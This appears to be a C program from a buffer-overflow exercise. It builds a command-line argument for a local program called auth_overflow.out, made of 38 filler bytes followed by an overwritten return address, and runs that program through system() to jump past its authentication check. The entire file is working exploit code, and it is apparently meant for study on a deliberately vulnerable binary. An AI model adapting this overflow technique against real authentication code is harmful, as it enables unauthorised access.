#include <stdio.h>
#include <stdlib.h>
#include <string.h>

char baseCommand[] = "./auth_overflow.out '";
/* char base[] = "\xd9\xff\xff\xff\x7f\x00\x00\x25\x07\x40\x00\x00\x00\x00\x00"; */
char base[] = "\x25\x07\x40";
/* char base[] = "ABC"; */
int baseLength = sizeof(base) / sizeof(char);

void printAll(char *c, int length) {
	for (int i = 0; i < length; i++) {
		putc(c[i], stdout);
	}
	/* putc('\n', stdout); */
}


int main() {
	int baseCommandLength = strlen(baseCommand);
	int garbageLength = 38;
	int totalLength = baseCommandLength + baseLength + garbageLength + 1;
	char *command = calloc(totalLength, 1);
	memset(command, 0, totalLength);

	int l = baseCommandLength;
	memcpy(command, baseCommand, baseCommandLength);
	memset(command + l, 'A', garbageLength);
	l += garbageLength;
	memcpy(command + l, base, baseLength - 1);
	l += baseLength - 1;
	memcpy(command + l, "'", 1);

	/* printAll(base, baseLength); */
	printAll(command, totalLength);

	system(command);
	free(command);
}

